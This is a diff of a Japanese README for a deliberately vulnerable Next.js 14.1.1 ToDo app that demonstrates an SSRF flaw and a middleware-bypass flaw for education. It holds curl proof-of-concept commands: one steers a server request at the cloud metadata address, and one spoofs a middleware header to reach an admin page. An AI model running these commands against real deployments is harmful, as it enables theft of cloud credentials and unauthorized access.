@@ -1,10 +1,13 @@
-# Next.js 14.1.1 SSRF Vulnerability Demo (CVE-2025-57822)
+# Next.js 14.1.1 脆弱性デモ (CVE-2025-57822 & CVE-2025-29927)
 
-ToDoリスト管理アプリケーションを使用して、Next.js 14.1.1のSSRF脆弱性を再現するためのデモプロジェクト。
+ToDoリスト管理アプリケーションを使用して、Next.js 14.1.1の2つの重大な脆弱性を再現するためのデモプロジェクト。
 
 ## 概要
 
-このプロジェクトは、BetterAuthを使用した認証機能を持つToDoアプリケーションで、Next.js 14.1.1のSSRF脆弱性（CVE-2025-57822）を実装しています。
+このプロジェクトは、BetterAuthを使用した認証機能を持つToDoアプリケーションで、Next.js 14.1.1の以下の脆弱性を実装しています:
+
+- **CVE-2025-57822**: SSRF (Server-Side Request Forgery) 脆弱性 - CVSS 6.5 (Medium)
+- **CVE-2025-29927**: ミドルウェアバイパス脆弱性 - CVSS 9.1 (Critical)
 
 **⚠️ 警告**: このプロジェクトは教育目的で意図的に脆弱性を含んでいます。本番環境では使用しないでください。
 
@@ -14,40 +17,33 @@ ToDoリスト管理アプリケーションを使用して、Next.js 14.1.1のSS
 - ToDoの作成、編集、削除
 - BetterAuthによる認証
 - Prisma + SQLite
-- **脆弱なMiddleware**: CVE-2025-57822の再現
+- **脆弱なMiddleware**: 2つのCVEを再現
+
+## 脆弱性の詳細
+
+### CVE-2025-57822: SSRF脆弱性
+
+ミドルウェアで生のヘッダーを`NextResponse.next()`に渡すことで、攻撃者が`Location`ヘッダーを操作してサーバー側から任意のURLへリクエストを送信可能。
+
+**検証ガイド**: [CVE-2025-57822-verification.md](.gemini/antigravity/brain/544e050b-18e6-4621-ae73-0e86f1c4c5cc/CVE-2025-57822-verification.md)
+
+### CVE-2025-29927: ミドルウェアバイパス
+
+`x-middleware-subrequest`ヘッダーを偽装することで、認証・認可チェックを完全にバイパス可能。
+
+**検証ガイド**: [CVE-2025-29927-verification.md](.gemini/antigravity/brain/544e050b-18e6-4621-ae73-0e86f1c4c5cc/CVE-2025-29927-verification.md)
 
 ## 開発環境のセットアップ
 
-### Dev Container（推奨）
-
-1. VS Codeで`Dev Containers`拡張機能をインストール
-2. このフォルダを開く
-3. `F1` → "Dev Containers: Reopen in Container"を選択
-4. 自動的に環境が構築され、開発サーバーが起動します
-
-### ローカル開発
-
-必要なもの:
-- Node.js 20+
-- Bun
-
-```bash
-# 依存関係のインストール
-bun install
-
-# Prismaクライアントの生成とマイグレーション
-bunx prisma generate
-bunx prisma migrate dev --name init
-
-# 開発サーバーの起動
-bun run dev
-```
+### 必要なもの
+- Docker & Docker Compose
+- ポート3000が利用可能であること
 
 ### Docker（本番ビルド）
 
 ```bash
 # ビルドと起動
-docker compose up -d
+docker compose up --build
 
 # 停止
 docker compose down
@@ -55,27 +51,49 @@ docker compose down
 
 ## 脆弱性の検証
 
-詳細な検証手順は[walkthrough.md](/.gemini/antigravity/brain/fb79dc41-65d5-42f5-a4d5-96a334da497c/walkthrough.md)を参照してください。
+### CVE-2025-57822 (SSRF) の検証
 
-### 基本的な検証
-
-1. http://localhost:3000 にアクセスしてアカウントを作成
-2. セッションCookieを取得
-3. 以下のコマンドでSSRFを試行:
+詳細は [CVE-2025-57822-verification.md](.gemini/antigravity/brain/544e050b-18e6-4621-ae73-0e86f1c4c5cc/CVE-2025-57822-verification.md) を参照。
 
 ```bash
+# 基本的なSSRF攻撃
 curl -H "Location: http://169.254.169.254/latest/meta-data/" \
      -H "Cookie: better-auth.session_token=<your-token>" \
      http://localhost:3000/
 ```
 
+### CVE-2025-29927 (ミドルウェアバイパス) の検証
+
+詳細は [CVE-2025-29927-verification.md](.gemini/antigravity/brain/544e050b-18e6-4621-ae73-0e86f1c4c5cc/CVE-2025-29927-verification.md) を参照。
+
+```bash
+# 管理者ページへの不正アクセス
+curl -H "x-middleware-subrequest: 1" \
+     -H "Cookie: better-auth.session_token=<non-admin-token>" \
+     http://localhost:3000/admin
+```
+
 ## プロジェクト構成
 
 - `/app` - Next.js App Router
+  - `/admin` - 管理者専用ページ (CVE-2025-29927のデモ)
 - `/lib` - BetterAuth設定
 - `/prisma` - データベーススキーマ
-- `middleware.ts` - **脆弱なMiddleware実装**
-- `.devcontainer` - Dev Container設定
+- `middleware.ts` - **脆弱なMiddleware実装** (両方のCVEを含む)
+
+## 検証手順の詳細
+
+各CVEの詳細な検証手順は、以下のドキュメントを参照してください:
+
+1. **[CVE-2025-57822 検証ガイド](.gemini/antigravity/brain/544e050b-18e6-4621-ae73-0e86f1c4c5cc/CVE-2025-57822-verification.md)**
+   - SSRF攻撃の実行方法
+   - AWSメタデータ窃取
+   - 内部ネットワークスキャン
+
+2. **[CVE-2025-29927 検証ガイド](.gemini/antigravity/brain/544e050b-18e6-4621-ae73-0e86f1c4c5cc/CVE-2025-29927-verification.md)**
+   - ミドルウェアバイパス攻撃
+   - 認証・認可の完全バイパス
+   - 管理者権限の不正取得
 
 ## ライセンス
 
